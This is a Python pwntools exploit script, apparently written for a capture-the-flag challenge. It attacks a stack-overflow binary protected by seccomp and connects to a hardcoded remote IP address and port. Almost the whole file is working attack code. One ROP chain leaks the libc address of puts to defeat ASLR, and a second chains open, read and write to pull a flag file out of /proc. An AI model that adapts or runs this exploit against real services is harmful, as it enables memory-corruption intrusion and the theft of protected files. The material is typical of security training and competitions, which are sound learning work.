#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.arch = "amd64"
context.bits = 64
exe = "./target"
exe = "./target-seccomp"
lib = "/lib/x86_64-linux-gnu/libc-2.27.so"

padding = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def writeToFile(payload, append=False, filename='shellcode'):
    # Write shellcode to a binary
    if append == True:
        f = open(filename, 'a')
    else:
        f = open(filename, 'w')
    f.write(payload)
    f.close()

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if exe == "./target":
    tmp = 0x601000
    # arg1
    # ropper --file ./target --search "pop rdi; ret"
    popRdi = 0x00000000004008d3 

    # arg2
    # ropper --file ./target --search 'pop rsi; pop %; ret'
    popRsi = 0x00000000004008d1

# Need to parse exe for our ropper
else:
    tmp = 0x602000
    # arg1
    # ropper --file ./target-seccomp --search "pop rdi; ret"
    popRdi = 0x0000000000400c63

    # arg2
    # ropper --file ./target-seccomp --search 'pop rsi; pop %; ret'
    # 0x0000000000400c61: pop rsi; pop r15; ret;
    popRsi = 0x0000000000400c61
    

# arg3
# ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdx; ret'
# 0x0000000000001b96: pop rdx; ret;
# NOTE because this is coming from the libc, we need to append the base
# address to this value.
popRdx = 0x0000000000001b96

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
target_binary = ELF(exe)
libc_binary = ELF(lib)

def getBase(leak):
    base = leak - libc_binary.symbols['puts']
    print 'base: 0x%x\n' % base
    return base
    
def leakPutsPayload(io, padding):
    '''
    payload1:
    [buf  ]
    [.....]
    [ra   ] -> pop rdi; ret
    [arg1 ] -> puts@got
    [ra   ] -> puts@plt
    [ra   ] -> start
    '''
    rop = ROP(target_binary)
    rop.raw(popRdi)
    rop.raw(target_binary.got['puts'])
    rop.raw(target_binary.plt['puts'])
    rop.raw(target_binary.symbols['start'])
    print rop.dump()
    payload = padding + rop.chain()
    io.sendline(payload)

    a = io.recvline()
    b = io.recvline()
    c = io.recvline()
    '''
    print 'a %s\n' % a
    print 'b %s\n' % b
    print 'c %s\n' % c
    '''
    d = c.ljust(8, '0')
    d = u64(d)
    print 'leaked putsGot: ' + hex(d & 0xffffffffffff)
    return (d & 0xffffffffffff)

# Get the leaked addresses
#io = start()
io = remote("52.201.10.159", 10701)
leak = leakPutsPayload(io, padding)
base = getBase(leak)
popRdx = popRdx + base
print "popRdx: %s" % hex(popRdx)

def printAddr():
    addr = next(target_binary.search('Password:'))
    rop = ROP(target_binary)
    rop.raw(popRdi)
    rop.raw(addr)
    rop.raw(target_binary.plt['puts'])
    rop.raw(target_binary.symbols['start'])
    print rop.dump()

    payload = padding + rop.chain()
    return payload

def getPayload_memset():
    tmp2 = tmp
    proc_str = "/proc/" 
    flag_str = "flag" 
    proc_ptr = next(libc_binary.search(proc_str))
    flag_ptr = next(libc_binary.search(flag_str))
    assert(proc_ptr != None)
    assert(flag_ptr != None)
    libc_binary.address = base
    p = process(exe)

    print "rop1"
    rop = ROP(target_binary, base=base)
    addr = tmp2
    addr = next(target_binary.search('Password:'))
    rop.raw(popRdi)
    rop.raw(addr)
    rop.raw(target_binary.plt['puts'])
    rop.raw(target_binary.symbols['start'])
    p.sendline(padding + rop.chain())

    rop = ROP(target_binary, base=base)
    print rop.dump()
    rop.raw(popRdi)
    rop.raw(tmp2)
    rop.raw(popRsi)
    rop.raw(proc_ptr)
    rop.raw(0xdeadbeef)
    rop.raw(popRdx)
    rop.raw(len(proc_str))
    # note that this works when I use read but fails when I use memcpy
    rop.raw(libc_binary.symbols['memcpy'])

    rop.raw(popRdi)
    rop.raw(tmp2 + len(proc_str))
    rop.raw(popRsi)
    rop.raw(flag_ptr)
    rop.raw(0xdeadbeef)
    rop.raw(popRdx)
    rop.raw(len(flag_str))
    rop.raw(libc_binary.symbols['memcpy'] + base)

    addr = tmp2
    addr = next(target_binary.search('Password:'))
    rop.raw(popRdi)
    rop.raw(addr)
    rop.raw(target_binary.plt['puts'])
    rop.raw(target_binary.symbols['start'])
    print rop.dump()

    payload = padding + rop.chain()
    writeToFile(payload)
    return payload

def readAddr(io):
    tmp2 = 0x7ffffffde000
    GOT_ADDR = 0x602000
    flag_str = '/proc/flag'
    print len(flag_str) % 4
    tmp2 = GOT_ADDR + 3 + (len(flag_str) % 4)

    rop = ROP(target_binary)
    rop.raw(popRdi)
    rop.raw(0)
    rop.raw(popRsi)
    rop.raw(tmp2)
    rop.raw(0xdeadbeef)
    rop.raw(popRdx)
    rop.raw(256)
    rop.raw(libc_binary.symbols['read'] + base)

    # Print out what we read
    rop.raw(popRdi)
    rop.raw(tmp2)
    rop.raw(target_binary.plt['puts'])
    rop.raw(target_binary.symbols['start'])

    print rop.dump()
    payload = padding + rop.chain()
    io.sendline(payload)
    io.send(flag_str)
    writeToFile(payload)

    print "{:*^20s}".format("")
    print "Second puts call\n"
    print io.recvall(timeout=0.5)
    exit()
    '''
    print io.recvuntil(flag_str,timeout=1)
    '''
    print "{:*^20s}".format("")

    return tmp2

def getPayload(io, padding):
    addr = next(target_binary.search('Password:'))
    addr = readAddr(io)

    rop = ROP(target_binary)
    rop.raw(popRdi)
    rop.raw(addr)
    rop.raw(popRsi)
    rop.raw(0)
    rop.raw(0xdeadbeef)
    rop.raw(libc_binary.symbols['open'] + base)

    '''
    rop.raw(target_binary.symbols['start'])
    print rop.dump()
    payload = padding + rop.chain()
    io.sendline(payload)
    print "jake1\n"
    rop = ROP(target_binary)
    '''

    rop.raw(popRdi)
    rop.raw(3)
    rop.raw(popRsi)
    rop.raw(tmp)
    rop.raw(0xdeadbeef)
    rop.raw(popRdx)
    rop.raw(1040)
    rop.raw(libc_binary.symbols['read'] + base)

    '''
    rop.raw(target_binary.symbols['start'])
    print rop.dump()
    payload = padding + rop.chain()
    io.sendline(payload)
    print "jake2\n"
    rop = ROP(target_binary)
    '''

    rop.raw(popRdi)
    rop.raw(1)
    rop.raw(popRsi)
    rop.raw(tmp)
    rop.raw(0xdeadbeef)
    rop.raw(popRdx)
    rop.raw(1040)
    rop.raw(libc_binary.symbols['write'] + base)

    print rop.dump()
    payload = padding + rop.chain()
    io.sendline(payload)
    return payload

payload = getPayload(io, padding)
io.sendline(payload)

try:
    print io.recvall()
except:
    log.failure("Failed to rcv anything!\n")

#io.close()
#print io.recvall()

#io.interactive()

